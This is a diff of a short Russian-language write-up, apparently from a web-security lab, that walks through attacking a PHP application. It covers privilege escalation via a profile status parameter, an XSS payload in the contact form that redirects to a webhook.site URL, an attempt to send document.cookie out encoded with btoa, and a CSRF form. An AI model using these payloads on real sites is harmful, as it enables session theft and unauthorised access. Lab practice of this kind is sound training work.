@@ -2,10 +2,10 @@
 
 <-!
 	1. Зарегистрировался под именем и паролем: в моем случае asd;123
-	2. Далее я просмотрел приложение и понял, что нужно получить доступ к /index.php?action=private, для этого надо получить доступ, установив в ?action=profile 
-	галочку на параметре status (status="on")
+	2. Далее я просмотрел приложение и понял, что нужно получить доступ к /index.php?action=private, для этого надо установить в ?action=profile 
+	галочку на параметре status (в запросе value="on" при value="usd")
 	3. Форма взаимодействия /index.php?action=contact - там я проверил, что есть возможность XSS:
-	payload: <script> window.location.href = "https://webhook.site/3a03bfae-c84f-4579-9357-5a1b288d82f2" </script>
+	payload: <script> window.location.href = "https://webhook.site/3a03bfae-c84f-4579-9357-5a1b288d82f2" </script> - сработал вебхук
 	4. Попытался отправить cookie с помощью get параметра, декодировав его вначале в base64, потом в encodeURIComponent(btoa(document.cookie)), однако хост не отправлял данные
 	5. Так как это CSRF, я создал дефолтную форму, она прошла
 	
